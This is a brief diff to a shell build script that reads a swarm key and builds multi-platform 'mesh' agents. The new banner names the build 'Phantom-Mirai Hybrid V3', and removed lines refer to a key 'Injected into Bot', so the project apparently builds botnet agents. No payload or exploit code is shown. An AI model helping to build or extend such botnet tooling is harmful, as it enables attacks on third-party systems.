@@ -37,18 +37,12 @@ if [ ! -f "$SWARM_KEY_PATH" ]; then
 fi
 SWARM_KEY=$(cat "$SWARM_KEY_PATH")
 
-echo "[3] Building Windows Agent..."
-make mesh_windows_amd64
+# Build
+echo "[*] Building Phantom-Mirai Hybrid V3..."
+make all
 
-echo "[4] Building Linux Agents..."
-make mesh_linux_amd64
-make mesh_linux_arm64
-
-echo "[OK] Build Complete."
-echo " -> Master Key: $KEY_PATH (KEEP PRIVATE)"
-echo " -> Master Pub: ${KEY_PATH}.pub (Injected into Bot)"
-echo ""
-echo "Artifacts are in 'dist/':"
+echo "[+] Build Complete!"
+echo "Artifacts in dist/:"
 ls -lh dist/
 echo ""
 echo "To control the Mesh:"
